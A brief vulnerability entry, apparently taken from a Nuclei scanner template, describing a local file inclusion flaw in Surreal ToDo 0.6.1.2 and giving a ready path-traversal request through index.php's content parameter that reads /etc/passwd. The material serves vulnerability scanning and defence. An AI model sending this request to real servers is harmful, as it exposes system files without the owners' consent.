# Vulnerability: Surreal ToDo 0.6.1.2 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`surrealtodo-lfi.yaml`)

## Description
Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php and the content parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?content=../../../../../../../../etc/passwd
```

